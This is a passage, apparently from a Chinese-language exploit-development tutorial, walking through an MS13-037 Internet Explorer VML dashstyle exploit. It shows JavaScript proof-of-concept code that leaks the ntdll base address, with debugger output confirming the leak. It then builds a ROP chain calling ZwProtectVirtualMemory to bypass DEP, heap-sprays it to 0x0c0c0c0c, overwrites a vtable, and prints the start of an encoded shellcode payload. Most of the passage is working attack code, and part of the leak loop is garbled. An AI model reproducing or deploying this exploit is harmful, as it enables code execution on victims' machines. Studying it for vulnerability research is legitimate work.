        var leak = a[i].marginLeft;
    2.通过第一步中泄露出来的基地址，使用ntdll模块中的指令构造出 rop链来调用ntdll!ZwProtectVirtualMemory 函数将shellcode地址设置为可读可写可执行权限，从而绕过 DEP ，并利用＂精准堆喷射＂技术将rop链的开头喷射到 0x0c0c0c0c这个地址处，再次的触发漏洞，修改对象的虚表，从而获得代码执行．覆盖虚表的关键代码如下：
        vml1.dashstyle.array.length = 0 - 1;
        vml1.dashstyle.array.item(6) = 0x0c0c0c0c;
先来看看实现信息泄露的poc代码：
    ms13_037
    var rect_array = new Array()
    var a          = new Array()
    function createRects(){
     for(var i=0; i 0) {
     vml1.dashstyle.array.item(0x2E+0x16) = 0x7ffe0300;
     var leak = a[i].marginLeft;
     vml1.dashstyle.array.item(0x2E+0x16) = marginLeftAddress;
     vml1.dashstyle.array.length = length_orig;
     ntdll_base=parseInt(leak.charCodeAt(1).toString(16)+leak.charCodeAt(0).toString(16), 16 ) - 290992;
     (ntdll_base.toString(16));
     break;
     }
     }
     return ntdll_base;
    }
和先前说的一样， **先** **通过vml1.dashstyle.array.item(0x2E+0x16) =
0x7ffe0300将marginLeft属性值的地址设为0x7ffe0300，**
**再通过读取marginLeft属性值获取
0x7ffe0300处四字节数据，减去0x470b0（即290992,同时dll版本不同偏移也不一样）得到ntdll的基地址** ，来看看效果：
可以看到我们的信息泄露时成功的，我们再从调试器的角度来验证下这个计算公式是否正确。附加进程断下后，查看0x7ffe0300处的数据：
    0:015> dd 0x7ffe0300
    7ffe0300  775e70b0 775e70b4 00000000 00000000
    7ffe0310  00000000 00000000 00000000 00000000
    7ffe0320  0006330e 00000000 00000000 00000000
    7ffe0330  cffa5133 00000000 00000dd0 00000000
    7ffe0340  00000000 00000000 00000000 00000000
    7ffe0350  00000000 00000000 00000000 00000000
    7ffe0360  00000000 00000000 00000000 00000000
    7ffe0370  00000000 00000000 00000000 00000000
**0x775e70b0－0x470b0 = 0x775a0000**
等于模块基地址，说明成功。现在我们已经得到了ntdll模块基地址于是我们就能构造我们的rop链了。下面我们将使用先前得到的模块基地址构造rop链之后再用”精准的堆喷射”技术将rop
链精准的布置到0x0c0c0c0c处。由于先前已经介绍了获取基地址的方式，这里直接定义基地址的值以减少篇幅。
喷射代码：
    function getRealAddr(base ,offect){
     var real_addr = base + offect;
     var str = real_addr.toString(16);
     var s1 = str.substring(0,4);
     var s2 = str.substring(4,8);
     return "%u" + s2 + "%u" + s1
    }
    var ntdll_base = 0x775a0000;
    stack_pivot = getRealAddr(ntdll_base,0x0001578a);//# ret # from ntdll
    stack_pivot += getRealAddr(ntdll_base,0x000096c9);//# pop ebx # ret # from ntdll
    stack_pivot += getRealAddr(ntdll_base,0x00015789);// # xchg eax, esp # ret from ntdll
    ntdll_rop = getRealAddr(ntdll_base ,0x45F18);//# ntdll!ZwProtectVirtualMemory
    ntdll_rop += "%u0c40%u0c0c";
    ntdll_rop += "%uffff%uffff";
    ntdll_rop += "%u0c34%u0c0c";
    ntdll_rop += "%u0c38%u0c0c";
    ntdll_rop += "%u0c40%u0c0c";
    ntdll_rop += "%u0c3c%u0c0c";
    ntdll_rop += "%u0c40%u0c0c";
    ntdll_rop += "%u0400%u0000";
    ntdll_rop += "%u4141%u4141";
    rop_chains = unescape(stack_pivot + ntdll_rop);
    //heapspray  
     // [ Shellcode ]
    var shellcode = unescape(
    "%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30" +
    "%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031" +
    "%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752" +
    "%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a" +
    "%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34" +
    "%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475" +
    "%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66" +
    "%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424" +